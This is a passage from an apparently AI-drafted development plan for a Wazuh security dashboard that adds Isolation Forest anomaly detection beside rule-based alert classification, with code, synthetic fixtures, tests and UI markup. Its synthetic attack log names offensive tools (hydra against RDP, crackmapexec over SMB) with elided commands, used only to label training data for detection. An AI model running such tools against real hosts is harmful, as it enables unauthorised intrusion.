    return alert.get("data", {}).get("win", {}).get("eventdata", {}).get("targetUserName", "Unknown")


def _extract_source_ip(alert: dict) -> str:
    eventdata = alert.get("data", {}).get("win", {}).get("eventdata", {})
    return eventdata.get("ipAddress") or alert.get("agent", {}).get("ip", "-")


def _encode_event_id(event_id: int | None) -> int:
    if event_id is None or event_id not in _EVENT_ID_INDEX:
        return _UNKNOWN_EVENT_ID_BUCKET
    return _EVENT_ID_INDEX[event_id]


def extract_features(alerts: list[dict]) -> list[dict]:
    """Processa `alerts` em ordem cronológica e devolve uma lista de
    dicts de features (uma por alerta com timestamp e Event ID válidos;
    alertas sem qualquer um dos dois são ignorados, como no resto da
    stack). A ordem devolvida é a ordem cronológica, não a ordem de
    entrada.
    """
    parsed = []
    for alert in alerts:
        ts = _parse_timestamp(alert.get("@timestamp"))
        event_id = _extract_event_id(alert)
        if ts is None or event_id is None:
            continue
        parsed.append((ts, event_id, alert))
    parsed.sort(key=lambda item: item[0])

    failed_attempts_by_user: dict[str, list[datetime]] = {}
    seen_ips_by_user: dict[str, set[str]] = {}
    rows: list[dict] = []

    for ts, event_id, alert in parsed:
        user = _extract_target_user(alert)
        ip = _extract_source_ip(alert)
        classification = classify_alert(event_id)

        if event_id == FAILED_LOGON_EVENT_ID:
            failed_attempts_by_user.setdefault(user, []).append(ts)
        window_start = ts - FAILED_ATTEMPTS_WINDOW
        recent_failures = [t for t in failed_attempts_by_user.get(user, []) if window_start <= t <= ts]

        ip_set = seen_ips_by_user.setdefault(user, set())
        is_new_ip = ip not in ip_set
        ip_set.add(ip)

        rows.append({
            "timestamp": ts.isoformat(),
            "windows_event_id": event_id,
            "target_user": user,
            "source_ip": ip,
            "agent_name": alert.get("agent", {}).get("name", "Unknown"),
            "severity": classification["severity"],
            "rule_flagged": classification["severity"] == "high",
            "hour_of_day": ts.hour,
            "day_of_week": ts.weekday(),
            "event_id_encoded": _encode_event_id(event_id),
            "failed_attempts_last_hour": len(recent_failures),
            "has_special_privileges": 1 if classification["category"] == "atividade_privilegiada" else 0,
            "is_new_source_ip": 1 if is_new_ip else 0,
            "severity_encoded": _SEVERITY_ORDER.get(classification["severity"], 0),
        })

    return rows


def load_attack_log(path: str) -> list[dict]:
    """Lê o log JSONL do attack_scenarios.py. Ficheiro ausente/vazio
    devolve lista vazia em vez de lançar exceção (nem sempre há um
    ataque registado ao correr o pipeline)."""
    entries: list[dict] = []
    try:
        with open(path, encoding="utf-8") as handle:
            for line in handle:
                line = line.strip()
                if line:
                    entries.append(json.loads(line))
    except FileNotFoundError:
        return []
    return entries


def label_with_attack_log(features: list[dict], attack_log: list[dict], window_seconds: int = 120) -> list[dict]:
    """Atribui is_attack (0/1) a cada linha de features por correspondência
    de timestamp: um evento é rotulado 1 se o seu timestamp cai dentro de
    [ataque.timestamp, ataque.timestamp + window_seconds] para qualquer
    entrada do log de ataques. Devolve uma NOVA lista (não modifica
    `features` in-place)."""
    windows = []
    for entry in attack_log:
        start = _parse_timestamp(entry.get("timestamp"))
        if start is None:
            continue
        windows.append((start, start + timedelta(seconds=window_seconds)))

    labeled = []
    for row in features:
        row_ts = _parse_timestamp(row["timestamp"])
        is_attack = any(start <= row_ts <= end for start, end in windows) if row_ts else False
        labeled.append({**row, "is_attack": 1 if is_attack else 0})
    return labeled


def vectorize(features: list[dict]) -> list[list[float]]:
    """Converte cada linha de features num vetor numérico, na ordem de
    FEATURE_NAMES — esta é a única função que o modelo/scaler devem ver."""
    return [[float(row[name]) for name in FEATURE_NAMES] for row in features]
```

- [ ] **Step 4: Run the tests again to confirm they pass**

Run: `cd scripts && python test_feature_extractor.py`
Expected: `[OK] Todos os testes passaram`, exit code 0.

- [ ] **Step 5: Commit**

```bash
git add scripts/feature_extractor.py scripts/test_feature_extractor.py
git commit -m "gauntlet(sentrylens): checkpoint onda 2 - feature_extractor.py + testes"
```

**Wave 2 checkpoint:** run the AAA gate on this commit's diff, then log the Notion entry for "Onda 2".

---

## Wave 3: `train_anomaly_model.py` + fixtures + metrics report

Depends on Wave 2's `feature_extractor.py` interfaces exactly as defined above.

### Task 4: fixture generator + fixtures

**Files:**
- Create: `scripts/_generate_sample_ml_data.py`
- Create (generated by running the script above): `scripts/sample_events_real.json`, `scripts/sample_attack_log.jsonl`

**Interfaces:**
- Produces: the two fixture files, in the exact shapes `feature_extractor.extract_features`/`load_attack_log` already expect (Wazuh alert shape / attack-log JSONL shape from Wave 1/2).

- [ ] **Step 1: Write the deterministic generator**

```python
"""
Gera os ficheiros de dados de treino/avaliação usados por
train_anomaly_model.py enquanto o laboratório Wazuh real não produz
dados suficientes (ver nota de desvio no README: substitui o
`sample_events_real.xml` do contrato original, que nunca existiu neste
repositório, por um fixture JSON no formato que o Wazuh Indexer
realmente devolve).

Determinístico (sem random) para que o dataset gerado seja sempre igual
e o relatório de métricas em ml_training_report.json seja reprodutível.

Corre-se uma única vez (ou sempre que se quiser reconstruir os
fixtures):
    python _generate_sample_ml_data.py
"""

import json
from pathlib import Path

OUTPUT_EVENTS = Path(__file__).parent / "sample_events_real.json"
OUTPUT_ATTACK_LOG = Path(__file__).parent / "sample_attack_log.jsonl"


def _event(event_id: int, ts: str, agent: str = "WIN-PC01", agent_ip: str = "192.168.1.5",
           user: str | None = None, ip: str | None = None, level: int = 5) -> dict:
    eventdata = {}
    if user is not None:
        eventdata["targetUserName"] = user
    if ip is not None:
        eventdata["ipAddress"] = ip
    return {
        "@timestamp": ts,
        "agent": {"name": agent, "ip": agent_ip},
        "rule": {"id": str(1000 + event_id), "description": f"Event {event_id}", "level": level},
        "data": {"win": {"system": {"eventID": str(event_id)}, "eventdata": eventdata}},
        "full_log": f"Synthetic event {event_id}",
    }


def build_events() -> list[dict]:
    events: list[dict] = []

    # --- Atividade normal: logons de sucesso em horário de expediente ---
    normal_logons = [
        ("mcosta", "192.168.1.10", "2026-09-01T09:0{}:00Z"),
        ("jsilva", "192.168.1.11", "2026-09-01T09:1{}:00Z"),
        ("adm.rsantos", "192.168.1.12", "2026-09-01T08:3{}:00Z"),
    ]
    for user, ip, ts_template in normal_logons:
        for i in range(3):
            events.append(_event(4624, ts_template.format(i), user=user, ip=ip, level=3))

    events.append(_event(4720, "2026-09-01T10:00:00Z", user="novo.colaborador", level=5))
    events.append(_event(4738, "2026-09-01T10:05:00Z", user="mcosta", level=5))
    events.append(_event(5140, "2026-09-01T11:00:00Z", user="jsilva", ip="192.168.1.11", level=3))
    events.append(_event(5140, "2026-09-01T11:05:00Z", user="jsilva", ip="192.168.1.11", level=3))
    events.append(_event(4725, "2026-09-01T15:00:00Z", user="ex.colaborador", level=5))
    events.append(_event(4767, "2026-09-01T15:30:00Z", user="mcosta", level=3))

    # --- Cenário de ataque A: força bruta RDP contra 'convidado', 03:00 ---
    for i in range(6):
        events.append(_event(4625, f"2026-09-02T03:0{i}:00Z", user="convidado", ip="203.0.113.50", level=10))
    events.append(_event(4740, "2026-09-02T03:06:00Z", user="convidado", ip="203.0.113.50", level=10))

    # --- Cenário de ataque B: pós-comprometimento fora de horário, 03:14 ---
    events.append(_event(4672, "2026-09-02T03:14:00Z", user="adm.rsantos", ip="203.0.113.50", level=12))
    events.append(_event(4698, "2026-09-02T03:15:00Z", user="adm.rsantos", ip="203.0.113.50", level=12))

    # --- Mais atividade normal noutro dia, para dar volume à classe normal ---
    for i in range(8):
        events.append(_event(4624, f"2026-09-03T{9 + i // 2:02d}:{(i % 2) * 30:02d}:00Z", user="mcosta", ip="192.168.1.10", level=3))
    for i in range(4):
        events.append(_event(4624, f"2026-09-03T1{i}:00:00Z", user="jsilva", ip="192.168.1.11", level=3))

    return events


def build_attack_log() -> list[dict]:
    return [
        {
            "timestamp": "2026-09-02T03:00:00+00:00",
            "scenario": "brute_force_rdp",
            "target": "203.0.113.50",
            "tool": "hydra",
            "status": "launched",
            "details": {"returncode": 0, "command": "hydra ... rdp://192.168.1.5"},
        },
        {
            "timestamp": "2026-09-02T03:14:00+00:00",
            "scenario": "lateral_movement_schtasks",
            "target": "192.168.1.5",
            "tool": "crackmapexec",
            "status": "launched",
            "details": {"returncode": 0, "command": "crackmapexec smb ..."},
        },
    ]


def main() -> None:
    events = build_events()
    with open(OUTPUT_EVENTS, "w", encoding="utf-8") as handle:
        json.dump(events, handle, ensure_ascii=False, indent=2)

    attack_log = build_attack_log()
    with open(OUTPUT_ATTACK_LOG, "w", encoding="utf-8") as handle:
        for entry in attack_log:
            handle.write(json.dumps(entry, ensure_ascii=False) + "\n")

    print(f"{len(events)} eventos escritos em {OUTPUT_EVENTS}")
    print(f"{len(attack_log)} entradas de ataque escritas em {OUTPUT_ATTACK_LOG}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Run it to produce the fixtures**

Run: `cd scripts && python _generate_sample_ml_data.py`
Expected: prints two counts (33 events, 2 attack log entries) and creates both files.

- [ ] **Step 3: Sanity-check the fixture through `feature_extractor.py`**

```bash
cd scripts && python -c "
import json
from feature_extractor import extract_features, load_attack_log, label_with_attack_log

events = json.load(open('sample_events_real.json', encoding='utf-8'))
attack_log = load_attack_log('sample_attack_log.jsonl')
features = label_with_attack_log(extract_features(events), attack_log)
attacks = sum(f['is_attack'] for f in features)
print(f'{len(features)} linhas de features, {attacks} rotuladas is_attack=1')
assert attacks > 0, 'o fixture tem de conter pelo menos um ataque rotulado'
assert attacks < len(features), 'o fixture tem de conter também atividade normal'
print('OK: fixture produz uma mistura de normal/ataque')
"
```

Expected: `OK: fixture produz uma mistura de normal/ataque`.

- [ ] **Step 4: Commit**

```bash
git add scripts/_generate_sample_ml_data.py scripts/sample_events_real.json scripts/sample_attack_log.jsonl
git commit -m "gauntlet(sentrylens): checkpoint onda 3a - fixtures sample_events_real.json (desvio: substitui .xml inexistente)"
```

### Task 5: `train_anomaly_model.py`

**Files:**
- Create: `scripts/train_anomaly_model.py`
- Modify: `scripts/requirements.txt` (add `scikit-learn`, `joblib`)
- Modify: `.gitignore` (ignore the generated `.pkl` model files)

**Interfaces:**
- Consumes: `feature_extractor.{FEATURE_NAMES, extract_features, load_attack_log, label_with_attack_log, vectorize}`.
- Produces: `scripts/models/isolation_forest.pkl`, `scripts/models/scaler.pkl` (loaded by `ml_anomalies.py` in Wave 4), and `scripts/ml_training_report.json` (committed — portfolio evidence of precision/recall/F1 and ML-vs-rules divergence on the fixture dataset).

- [ ] **Step 1: Add dependencies**

In `scripts/requirements.txt`, append:
```
scikit-learn==1.5.2
joblib==1.4.2
```

Run: `pip install -r scripts/requirements.txt`
Expected: installs cleanly (or confirms already satisfied).

- [ ] **Step 2: Write the training script**

```python
"""
Treina o modelo de deteção de anomalias (Isolation Forest) sobre o
dataset de features partilhado com o endpoint /api/ml-anomalies via
feature_extractor.py, e compara o resultado com a classificação por
regras já existente em event_catalog.py (não modificado por este
script).

*** IMPORTANTE: este treino usa dados sintéticos (sample_events_real.json
+ sample_attack_log.jsonl, ver scripts/_generate_sample_ml_data.py),
porque o laboratório Wazuh ainda não tem dados reais suficientes. As
métricas abaixo validam que o PIPELINE está correto, não que o modelo
tenha uma boa taxa de deteção em produção — ver README.md. ***

Uso:
    python train_anomaly_model.py
    python train_anomaly_model.py --events sample_events_real.json --attack-log sample_attack_log.jsonl
"""

import argparse
import json
from pathlib import Path

import joblib
from sklearn.ensemble import IsolationForest
from sklearn.metrics import f1_score, precision_score, recall_score
from sklearn.preprocessing import StandardScaler

from feature_extractor import extract_features, label_with_attack_log, load_attack_log, vectorize

DEFAULT_EVENTS_PATH = Path(__file__).parent / "sample_events_real.json"
DEFAULT_ATTACK_LOG_PATH = Path(__file__).parent / "sample_attack_log.jsonl"
DEFAULT_MODEL_DIR = Path(__file__).parent / "models"
DEFAULT_REPORT_PATH = Path(__file__).parent / "ml_training_report.json"


def load_dataset(events_path: Path, attack_log_path: Path) -> list[dict]:
    with open(events_path, encoding="utf-8") as handle:
        alerts = json.load(handle)
    attack_log = load_attack_log(str(attack_log_path))
    return label_with_attack_log(extract_features(alerts), attack_log)


def train_model(vectors: list[list[float]], contamination: float = 0.2, random_state: int = 42):
    scaler = StandardScaler()
    scaled = scaler.fit_transform(vectors)
    model = IsolationForest(contamination=contamination, random_state=random_state, n_estimators=200)
    model.fit(scaled)
    return model, scaler


def evaluate(feature_rows: list[dict], model, scaler) -> dict:
    vectors = vectorize(feature_rows)
    scaled = scaler.transform(vectors)
    predictions = model.predict(scaled)  # -1 = anómalo, 1 = normal

    ml_flags = [pred == -1 for pred in predictions]
    rule_flags = [row["rule_flagged"] for row in feature_rows]
    truth = [bool(row.get("is_attack")) for row in feature_rows]

    def prf(flags: list[bool]) -> dict:
        return {
            "precision": round(precision_score(truth, flags, zero_division=0), 4),
            "recall": round(recall_score(truth, flags, zero_division=0), 4),
            "f1": round(f1_score(truth, flags, zero_division=0), 4),
        }

    both = sum(1 for m, r in zip(ml_flags, rule_flags) if m and r)
    ml_only = sum(1 for m, r in zip(ml_flags, rule_flags) if m and not r)
    rule_only = sum(1 for m, r in zip(ml_flags, rule_flags) if r and not m)
    neither = sum(1 for m, r in zip(ml_flags, rule_flags) if not m and not r)

    return {
        "total_events": len(feature_rows),
        "attacks_in_dataset": sum(truth),
        "ml": prf(ml_flags),
        "rules": prf(rule_flags),
        "comparison": {"both_flagged": both, "ml_only": ml_only, "rules_only": rule_only, "neither": neither},
        "caveat": "Métricas calculadas sobre dados sintéticos (sample_events_real.json), "
                  "não validadas contra o laboratório Wazuh real.",
    }


def save_model(model, scaler, model_dir: Path = DEFAULT_MODEL_DIR) -> None:
    model_dir.mkdir(parents=True, exist_ok=True)
    joblib.dump(model, model_dir / "isolation_forest.pkl")
    joblib.dump(scaler, model_dir / "scaler.pkl")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--events", default=str(DEFAULT_EVENTS_PATH))
    parser.add_argument("--attack-log", default=str(DEFAULT_ATTACK_LOG_PATH))
    parser.add_argument("--model-dir", default=str(DEFAULT_MODEL_DIR))
    parser.add_argument("--report", default=str(DEFAULT_REPORT_PATH))
    parser.add_argument("--contamination", type=float, default=0.2)
    args = parser.parse_args()

    feature_rows = load_dataset(Path(args.events), Path(args.attack_log))
    vectors = vectorize(feature_rows)

    model, scaler = train_model(vectors, contamination=args.contamination)
    save_model(model, scaler, Path(args.model_dir))

    report = evaluate(feature_rows, model, scaler)
    with open(args.report, "w", encoding="utf-8") as handle:
        json.dump(report, handle, ensure_ascii=False, indent=2)

    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"\nModelo guardado em: {args.model_dir}")
    print(f"Relatório guardado em: {args.report}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 3: Run it and inspect the metrics**

Run: `cd scripts && python train_anomaly_model.py`
Expected: prints a JSON report with `ml`/`rules` precision/recall/f1 and a `comparison` block, creates `scripts/models/isolation_forest.pkl`, `scripts/models/scaler.pkl`, and `scripts/ml_training_report.json`. Exit code 0. On this fixture, both `ml_only` and `rules_only` in `comparison` should be non-zero — if either is always 0 across a couple of `--contamination` values, that's a sign the fixture doesn't yet exercise a real divergence and Task 4's fixture should be revisited before moving on (this is the entire point of the exercise per the contract's "Por quê").

- [ ] **Step 4: Ignore the generated model files**

Add to `.gitignore`:
```
scripts/models/
```

- [ ] **Step 5: Commit**

```bash
git add scripts/train_anomaly_model.py scripts/requirements.txt scripts/ml_training_report.json .gitignore
git commit -m "gauntlet(sentrylens): checkpoint onda 3b - train_anomaly_model.py + relatorio de metricas"
```

**Wave 3 checkpoint:** two commits (Task 4 + Task 5), both within Wave 3. Run the AAA gate, then log the Notion entry for "Onda 3" — **including the `.xml` → `.json` fixture deviation explicitly**, per Global Constraints above.

---

## Wave 4: `/api/ml-anomalies` endpoint + tests

Depends on Wave 2's `feature_extractor.py` and Wave 3's trained `.pkl` files (for a real run; tests below never touch the files on disk).

### Task 6: `ml_anomalies.py` + endpoint wiring

**Files:**
- Create: `scripts/ml_anomalies.py`
- Modify: `scripts/main.py` (add the endpoint)
- Modify: `scripts/.env.example` (document the new optional path override)

**Interfaces:**
- Consumes: `feature_extractor.{extract_features, vectorize}`, `joblib`.
- Produces: `build_ml_anomalies_report(alerts: list[dict], model, scaler) -> dict` and `load_model(model_dir: str | None = None) -> tuple[model, scaler]`, both imported by `main.py`.

- [ ] **Step 1: Write `ml_anomalies.py`**

```python
"""
Painel de deteção de anomalias por Machine Learning (Isolation Forest),
correndo em PARALELO com a classificação por regras do event_catalog.py
— nunca a substitui. Módulo puro (como lifecycle.py/rbac.py/
admin_activity.py): recebe alertas já obtidos do Wazuh, e o modelo/scaler
já carregados, e devolve um relatório pronto para o endpoint servir.

O modelo é treinado por train_anomaly_model.py sobre
feature_extractor.py — o MESMO módulo de extração de features usado
aqui, para que treino e inferência nunca divirjam.
"""

import os

import joblib

from feature_extractor import extract_features, vectorize

DEFAULT_MODEL_DIR = os.path.join(os.path.dirname(__file__), "models")

_model = None
_scaler = None


def load_model(model_dir: str | None = None):
    """Carrega (e mantém em cache no processo) o modelo + scaler
    treinados. Lança FileNotFoundError com uma mensagem acionável se
    train_anomaly_model.py ainda não correu — quem chama decide o
    código de estado HTTP.

    Nota de segurança: joblib.load desserializa pickle, o que permite
    execução arbitrária de código sobre ficheiros não confiáveis. Aqui é
    seguro porque os .pkl só podem vir de train_anomaly_model.py a
    correr localmente (nunca são recebidos de upload, rede ou de fora
    deste repositório) — ver ML_MODEL_DIR em main.py, que aponta sempre
    para uma pasta local gerida por nós.
    """
    global _model, _scaler
    if _model is not None and _scaler is not None:
        return _model, _scaler

    model_dir = model_dir or DEFAULT_MODEL_DIR
    model_path = os.path.join(model_dir, "isolation_forest.pkl")
    scaler_path = os.path.join(model_dir, "scaler.pkl")
    if not os.path.exists(model_path) or not os.path.exists(scaler_path):
        raise FileNotFoundError(
            f"Modelo de ML não encontrado em '{model_dir}'. Corre "
            "'python train_anomaly_model.py' primeiro para o gerar."
        )

    _model = joblib.load(model_path)
    _scaler = joblib.load(scaler_path)
    return _model, _scaler


def build_ml_anomalies_report(alerts: list[dict], model, scaler) -> dict:
    """Função pura: aplica o modelo já carregado aos alertas e devolve o
    relatório lado a lado com a classificação por regras (rule_flagged,
    já calculado em feature_extractor.extract_features)."""
    features = extract_features(alerts)
    if not features:
        return {
            "total": 0, "ml_anomalies_count": 0, "rule_flagged_count": 0,
            "agree_count": 0, "diverge_count": 0, "results": [],
        }

    vectors = vectorize(features)
    scaled = scaler.transform(vectors)
    # decision_function: quanto MAIOR (mais positivo), mais "normal" o
    # IsolationForest considera o ponto; valores negativos indicam
    # anomalia. ml_is_anomaly (abaixo) já traduz isto para um booleano —
    # ml_score fica exposto em bruto só para quem quiser o grau, não só
    # o veredicto.
    scores = model.decision_function(scaled)
    predictions = model.predict(scaled)

    results = []
    agree = 0
    for row, score, pred in zip(features, scores, predictions):
        ml_is_anomaly = bool(pred == -1)
        rule_flagged = bool(row["rule_flagged"])
        agreement = "agree" if ml_is_anomaly == rule_flagged else "diverge"
        agree += agreement == "agree"
        results.append({
            "timestamp": row["timestamp"],
            "agent_name": row["agent_name"],
            "target_user": row["target_user"],
            "windows_event_id": row["windows_event_id"],
            "severity": row["severity"],
            "rule_flagged": rule_flagged,
            "ml_score": round(float(score), 4),
            "ml_is_anomaly": ml_is_anomaly,
            "agreement": agreement,
        })

    ml_count = sum(r["ml_is_anomaly"] for r in results)
    rule_count = sum(r["rule_flagged"] for r in results)
    return {
        "total": len(results),
        "ml_anomalies_count": ml_count,
        "rule_flagged_count": rule_count,
        "agree_count": agree,
        "diverge_count": len(results) - agree,
        "results": results,
    }
```

- [ ] **Step 2: Wire the endpoint into `main.py`**

Add near the other imports (`scripts/main.py`, alongside the existing domain imports):

```python
import ml_anomalies
```

Deliberate deviation from this file's usual `from X import Y` style for sibling modules (`from admin_activity import build_admin_activity_report`, etc.): the endpoint below calls `ml_anomalies.load_model(...)` and `ml_anomalies.build_ml_anomalies_report(...)` through the module object on purpose, because `test_ml_anomalies.py` (Step 4) monkeypatches `ml_anomalies.load_model` and `ml_anomalies._model`/`ml_anomalies._scaler` directly — a `from ml_anomalies import load_model` binding in `main.py` would capture the original function object at import time and never see that monkeypatch. Keep the qualified `ml_anomalies.` calls; do not "clean up" this import to match the other modules.

Add the config constant near `RBAC_BASELINE_PATH`:

```python
ML_MODEL_DIR = os.getenv("ML_MODEL_DIR", os.path.join(os.path.dirname(__file__), "models"))
```

Add the endpoint after `get_admin_activity` (end of `scripts/main.py`):

```python
@app.get("/api/ml-anomalies")
async def get_ml_anomalies(hours: int = Query(24, ge=1, le=168, description="Janela temporal em horas")):
    """
    Deteção de anomalias por Machine Learning (Isolation Forest), lado a
    lado com a classificação por regras do event_catalog.py. Corre em
    paralelo com as regras — não as substitui.
    """
    try:
        model, scaler = ml_anomalies.load_model(ML_MODEL_DIR)
    except FileNotFoundError as e:
        raise HTTPException(status_code=503, detail=str(e))

    try:
        raw_alerts = await indexer_client.get_recent_alerts(hours=hours, size=1000)
        report = ml_anomalies.build_ml_anomalies_report(raw_alerts, model, scaler)
        report["window_hours"] = hours
        return report
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Erro ao contactar Wazuh Indexer: {e}")
```

- [ ] **Step 3: Document the new env override**

In `scripts/.env.example`, append:
```
# Diretório com isolation_forest.pkl + scaler.pkl (ver train_anomaly_model.py).
# Default: <pasta de scripts>/models
ML_MODEL_DIR=
```

- [ ] **Step 4: Write the failing regression tests**

Create `scripts/test_ml_anomalies.py`:

```python
"""
Testes de regressão de /api/ml-anomalies, sem laboratório Wazuh nem
modelo treinado em disco: treina um Isolation Forest minúsculo em
memória sobre um punhado de alertas mock e injeta-o via monkeypatch em
ml_anomalies (mesmo padrão de main.indexer_client.get_recent_alerts =
AsyncMock(...) usado em test_with_mock.py).

Correr:
    python test_ml_anomalies.py
"""

import sys
from unittest.mock import AsyncMock

from fastapi.testclient import TestClient

import main
import ml_anomalies
from feature_extractor import extract_features, vectorize
from train_anomaly_model import train_model

main.app.router.on_startup.clear()

failures: list[str] = []


def check(label: str, condition: bool) -> None:
    print(f"[{'OK   ' if condition else 'FALHOU'}] {label}")
    if not condition:
        failures.append(label)


def alert(event_id: int, ts: str, user: str = "jsilva", ip: str = "192.168.1.10") -> dict:
    return {
        "@timestamp": ts,
        "agent": {"name": "WIN-PC01", "ip": "192.168.1.5"},
        "rule": {"id": "1", "description": "x", "level": 5},
        "data": {"win": {"system": {"eventID": str(event_id)}, "eventdata": {"targetUserName": user, "ipAddress": ip}}},
        "full_log": "x",
    }


MOCK_ALERTS = (
    [alert(4624, f"2026-09-01T09:0{i}:00Z", user="mcosta") for i in range(4)]
    + [alert(4625, f"2026-09-02T03:0{i}:00Z", user="convidado", ip="203.0.113.50") for i in range(6)]
)


def run() -> None:
    # Treina um modelo minúsculo sobre os próprios MOCK_ALERTS, para não
    # depender de scripts/models/*.pkl existirem em disco.
    feature_rows = extract_features(MOCK_ALERTS)
    vectors = vectorize(feature_rows)
    fake_model, fake_scaler = train_model(vectors, contamination=0.3, random_state=1)
    ml_anomalies._model = fake_model
    ml_anomalies._scaler = fake_scaler

    main.indexer_client.get_recent_alerts = AsyncMock(return_value=MOCK_ALERTS)
    client = TestClient(main.app)

    resp = client.get("/api/ml-anomalies")
    check("GET /api/ml-anomalies devolve 200", resp.status_code == 200)
    body = resp.json()
    check("total bate com o nº de alertas mockados", body["total"] == len(MOCK_ALERTS))
    check("cada resultado tem ml_score e ml_is_anomaly", all("ml_score" in r and "ml_is_anomaly" in r for r in body["results"]))
    check("cada resultado tem rule_flagged e agreement", all("rule_flagged" in r and r["agreement"] in ("agree", "diverge") for r in body["results"]))
    check("agree_count + diverge_count == total", body["agree_count"] + body["diverge_count"] == body["total"])
    check("window_hours default é 24", body["window_hours"] == 24)

    # --- 503 quando não há modelo treinado ---
    ml_anomalies._model = None
    ml_anomalies._scaler = None

    def _raise_not_found(model_dir=None):
        raise FileNotFoundError("modelo não encontrado (simulado)")

    original_load_model = ml_anomalies.load_model
    ml_anomalies.load_model = _raise_not_found
    resp_missing = client.get("/api/ml-anomalies")
    check("sem modelo treinado devolve 503", resp_missing.status_code == 503)
    ml_anomalies.load_model = original_load_model

    print()
    if failures:
        print(f"[FALHOU] {len(failures)} teste(s) falharam: {failures}")
        sys.exit(1)
    print("[OK] Todos os testes passaram")
    sys.exit(0)


if __name__ == "__main__":
    run()
```

- [ ] **Step 5: Run it to confirm it fails first (endpoint doesn't exist yet if Step 2 weren't already applied — run before Step 2 in a strict TDD flow, or immediately after as a checkpoint)**

Run: `cd scripts && python test_ml_anomalies.py`
Expected (before Step 2's edit lands): 404 on `/api/ml-anomalies`, `check` reports `[FALHOU]`, exit 1. If Step 2 was already applied when this runs, skip straight to Step 6 and confirm pass instead — either order is fine as long as you observe one red run before the final green run.

- [ ] **Step 6: Run it again after Step 2 + Step 4 are both in place**

Run: `cd scripts && python test_ml_anomalies.py`
Expected: `[OK] Todos os testes passaram`, exit code 0.

- [ ] **Step 7: Re-run the full existing suite to confirm no regression**

Run: `cd scripts && python test_with_mock.py && python test_new_panels.py && python test_feature_extractor.py`
Expected: all three print their respective `[OK]`/success line, exit 0.

- [ ] **Step 8: Commit**

```bash
git add scripts/ml_anomalies.py scripts/main.py scripts/test_ml_anomalies.py scripts/.env.example
git commit -m "gauntlet(sentrylens): checkpoint onda 4 - endpoint /api/ml-anomalies + testes"
```

**Wave 4 checkpoint:** run the AAA gate, then log the Notion entry for "Onda 4".

---

## Wave 5: frontend panel

Depends on Wave 4's exact `/api/ml-anomalies` response shape.

### Task 7: "ML Anomalias" tab

**Files:**
- Modify: `index.html` (new tab button + tab content, following the `tab-privileges` pattern shown above)
- Modify: `app.js` (new render + load functions, following the `loadPrivilegesPanel` pattern shown above)
- Modify: `style.css` (agreement/divergence badge styles, reusing existing tokens)

**Interfaces:**
- Consumes: `GET /api/ml-anomalies?hours=N` → `{total, ml_anomalies_count, rule_flagged_count, agree_count, diverge_count, window_hours, results: [{timestamp, agent_name, target_user, windows_event_id, severity, rule_flagged, ml_score, ml_is_anomaly, agreement}]}` (Wave 4's exact shape).

- [ ] **Step 1: Add the tab button** in `index.html`, after the existing `admin-activity` button:

```html
<button class="tab-btn" data-tab="ml-anomalies">🧠 ML Anomalias</button>
```

- [ ] **Step 2: Add the tab panel markup** in `index.html`, after the `tab-admin-activity` closing `</div>`:

```html
<!-- ===== ML Anomalias ===== -->
<div class="tab-content" id="tab-ml-anomalies">
  <section class="panel" id="ml-anomalies-panel">
    <h2>🧠 ML Anomalias</h2>
    <p class="panel-note">
      Deteção por Isolation Forest, a correr em paralelo com a classificação por regras
      (event_catalog.py) — nunca a substitui. Modelo treinado sobre dados sintéticos;
      ver README para o que isto ainda não valida.
    </p>

    <section class="kpi-grid" id="ml-anomalies-kpi-grid">
      <div class="card">
        <h3>Eventos Analisados</h3>
        <div class="value" id="kpi-ml-total">—</div>
      </div>
      <div class="card">
        <h3>Anomalias (ML)</h3>
        <div class="value" id="kpi-ml-anomalies">—</div>
      </div>
      <div class="card">
        <h3>Sinalizados por Regras</h3>
        <div class="value" id="kpi-ml-rule-flagged">—</div>
      </div>
      <div class="card">
        <h3>Concordância ML / Regras</h3>
        <div class="value" id="kpi-ml-agreement">—</div>
      </div>
    </section>

    <div class="table-scroll">
      <table id="ml-anomalies-table">
        <thead>
          <tr>
            <th>Data</th>
            <th>Agente</th>
            <th>Utilizador</th>
            <th>Event ID</th>
            <th>Severidade (Regras)</th>
            <th>Score ML</th>
            <th>Anomalia (ML)</th>
            <th>Concordância</th>
          </tr>
        </thead>
        <tbody id="ml-anomalies-body">
          <tr><td colspan="8" class="empty-state">A carregar...</td></tr>
        </tbody>
      </table>
    </div>
  </section>
</div>
```

- [ ] **Step 3: Add render + load functions** in `app.js`, after the admin-activity section (following the exact `renderPanelError`/`fetchJSON`/`escapeHtml`/`formatTimestamp` helpers already defined earlier in the file). Reuse the existing `severityBadge(severity)` helper (defined near the top of `app.js`, already used by the alerts panel) for the severity cell — do not hand-roll a new severity badge markup/class; its existing output is `<span class="severity-badge ${severity}">${label}</span>` (bare severity as the second class, no `severity-` prefix):

```javascript
// --- Painel: ML Anomalias (tab-ml-anomalies) ---

function renderMlAnomaliesTable(results) {
  const tbody = document.getElementById("ml-anomalies-body");
  tbody.innerHTML = "";

  if (!results || results.length === 0) {
    tbody.innerHTML = '<tr><td colspan="8" class="empty-state">Sem eventos neste período</td></tr>';
    return;
  }

  results.forEach((r) => {
    const tr = document.createElement("tr");
    tr.className = r.agreement === "diverge" ? "row-diverge" : "";
    tr.innerHTML = `
      <td class="mono">${escapeHtml(formatTimestamp(r.timestamp))}</td>
      <td>${escapeHtml(r.agent_name)}</td>
      <td>${escapeHtml(r.target_user)}</td>
      <td>${escapeHtml(String(r.windows_event_id))}</td>
      <td>${severityBadge(r.severity)}</td>
      <td class="mono">${r.ml_score.toFixed(4)}</td>
      <td>${r.ml_is_anomaly ? "⚠️ Sim" : "Não"}</td>
      <td><span class="agreement-badge agreement-${r.agreement}">${r.agreement === "agree" ? "✅ Concorda" : "⚡ Diverge"}</span></td>
    `;
    tbody.appendChild(tr);
  });
}

async function loadMlAnomaliesPanel(hours) {
  try {
    const data = await fetchJSON(`/api/ml-anomalies?hours=${hours}`);
    renderPanelError("#ml-anomalies-panel", null);

    document.getElementById("kpi-ml-total").textContent = data.total ?? 0;
    document.getElementById("kpi-ml-anomalies").textContent = data.ml_anomalies_count ?? 0;
    document.getElementById("kpi-ml-rule-flagged").textContent = data.rule_flagged_count ?? 0;
    const total = data.total || 0;
